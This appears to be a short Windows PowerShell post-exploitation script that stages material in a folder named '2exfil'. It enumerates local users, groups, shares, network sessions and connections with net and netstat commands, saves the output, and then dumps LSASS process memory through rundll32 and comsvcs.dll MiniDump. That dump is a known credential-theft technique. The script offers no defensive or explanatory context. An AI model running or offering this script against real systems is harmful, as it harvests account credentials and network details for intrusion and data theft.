mkdir c:\temp\2exfil
$dog = c:\temp\2exfil\AccountInfo.txt
$dog2 = c:\temp\2exfil\NetworkInfo.txt
net user >> $dog
net localgroup >> $dog
net group >> $dog
net use >> $dog
net share >> $dog  
net view >> $dog
net accounts >> $dog
Netstat -a >> $dog2

$P = get-process lsass |select -expand id
C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $P c:\temp\2exfil\dump.txt full
